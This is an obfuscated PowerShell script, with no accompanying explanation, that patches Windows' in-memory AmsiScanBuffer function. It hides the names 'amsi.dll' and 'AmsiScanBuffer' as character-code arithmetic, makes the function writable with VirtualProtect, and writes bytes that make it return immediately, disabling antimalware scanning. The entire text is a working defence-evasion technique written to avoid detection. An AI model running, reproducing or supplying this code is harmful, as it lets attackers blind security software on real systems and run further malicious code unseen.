$Mig = @"
using System;
using System.Runtime.InteropServices;
public class Mig {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr dsywh_mau4RHcWPJyJ1_, string bkdw5k);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr awXtSDEi9eZ_mG, UIntPtr MoHKmJPmcet7HC4, uint GS6, out uint vRozY);
}
"@

Add-Type $Mig

$AGgweQ6 = [Mig]::LoadLibrary("$([ChAR]([byTe]0x61)+[ChaR]([bytE]0x6d)+[chAr]([byte]0x73)+[cHaR]([bYtE]0x69)+[CHAr]([Byte]0x2e)+[cHaR](100)+[chAr]([byTE]0x6c)+[cHar](108+26-26))")
$na1kzMFs1J = [Mig]::GetProcAddress($AGgweQ6, "$([cHaR](52+13)+[ChAr](109)+[CHaR](31+84)+[cHaR](105+10-10)+[CHar](83)+[CHAR]([BYte]0x63)+[chAr](10+87)+[ChAR](110+61-61)+[cHaR]([BYTE]0x42)+[cHaR](117+85-85)+[ChAR](102)+[cHAR](86+16)+[CHaR]([BYTe]0x65)+[CHAR](114+58-58))")
$p = 0
[Mig]::VirtualProtect($na1kzMFs1J, [uint32]5, 0x40, [ref]$p)
$GKVELlwBa9HDA = "0xB8"
$Rstjk6z6 = "0x57"
$XseZM4G = "0x00"
$Aw6xNoEE = "0x07"
$HA1y1Qv_NLXX_4 = "0x80"
$nI5F = "0xC3"
$SE_sVQ_Myx = [Byte[]] ($GKVELlwBa9HDA,$Rstjk6z6,$XseZM4G,$Aw6xNoEE,+$HA1y1Qv_NLXX_4,+$nI5F)
[System.Runtime.InteropServices.Marshal]::Copy($SE_sVQ_Myx, 0, $na1kzMFs1J, 6)